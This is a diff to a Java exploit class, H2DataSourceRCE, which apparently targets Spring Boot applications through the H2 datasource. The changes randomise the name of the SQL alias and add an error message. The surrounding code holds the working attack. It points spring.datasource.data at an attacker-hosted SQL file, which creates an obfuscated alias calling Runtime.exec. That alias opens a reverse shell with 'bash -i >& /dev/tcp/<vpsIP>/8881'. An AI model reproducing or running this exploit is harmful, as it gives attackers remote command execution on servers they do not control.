@@ -8,6 +8,7 @@ import java.net.HttpURLConnection;
 import java.net.URL;
 import java.nio.charset.StandardCharsets;
 import java.util.List;
+import java.util.Random;
 import java.util.Scanner;
 import java.util.regex.Matcher;
 import java.util.regex.Pattern;
@@ -24,7 +25,7 @@ public class H2DataSourceRCE {
     public String expData2 = "{\"name\":\"spring.datasource.data\",\"value\":\"http://%s/H2DbSourcePoc.sql\"}";
     private static String sqlexp = "CREATE ALIAS %s AS CONCAT('void ex(String m1,String m2,String m3)throws Exception{Runti','me.getRun','time().exe','c(new String[]{m1,m2,m3});}');CALL %s('/bin/bash','-c','bash -i >& /dev/tcp/%s/8881 0>&1');";
     public String flag = "T";
-    public static int count = 5;
+    public static int count;
 
     public H2DataSourceRCE(String address,String vpsIP,String vpsPort){
         this.address = address;
@@ -83,6 +84,7 @@ public class H2DataSourceRCE {
                     int responseCode1 = conn1.getResponseCode();
                     if (responseCode1 == HttpURLConnection.HTTP_OK){
                         try {
+                            count = (int) (Math.random() * 900) + 100;
                             flag = "T" + String.valueOf(count);
                             String exp = String.format(sqlexp, flag,flag, vpsIP);
                             FileWriter writer = new FileWriter(System.getProperty("user.dir") + "/resources/H2DbSourcePoc.sql");
@@ -182,7 +184,8 @@ public class H2DataSourceRCE {
                     int responseCode1 = conn1.getResponseCode();
                     if (responseCode1 == HttpURLConnection.HTTP_OK){
                         try {
-                            flag = "T" + new String(String.valueOf(count));
+                            count = (int) (Math.random() * 900) + 100;
+                            flag = "T" + String.valueOf(count);
                             String exp = String.format(sqlexp, flag, flag, vpsIP);
                             FileWriter writer = new FileWriter(System.getProperty("user.dir") + "/resources/H2DbSourcePoc.sql");
                             Scanner sc = new Scanner(System.in);
@@ -226,6 +229,8 @@ public class H2DataSourceRCE {
                 callback.onResult(text);
             }
         }catch (Exception e){
+            text = "查找依赖异常";
+            callback.onResult(text);
             e.printStackTrace();
         }
     }
